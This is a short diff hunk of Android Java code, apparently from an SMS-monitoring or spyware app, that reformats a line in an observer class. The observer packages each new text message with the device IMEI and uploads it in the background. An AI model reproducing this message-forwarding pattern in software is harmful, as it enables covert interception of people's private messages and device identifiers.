@@ -81,8 +81,7 @@ public class PhoneSMSObsv extends ContentObserver {
                     jsarray.put(0,jsobj);
 
 
-                    UploadData sendmsg = new UploadData(jsarray.toString().getBytes(),
-                            jsarray.toString().getBytes().length,Public.CMD_DATA_LATESTMESSAGE, Public.IMEI);
+                    UploadData sendmsg = new UploadData(jsarray.toString().getBytes(), jsarray.toString().getBytes().length,Public.CMD_DATA_LATESTMESSAGE, Public.IMEI);
                     Thread threadsendloc = new Thread(sendmsg);
                     threadsendloc.start();
                     MyLog.writeLogFile("SMSContentObserver receive new message:" + jsarray.toString());
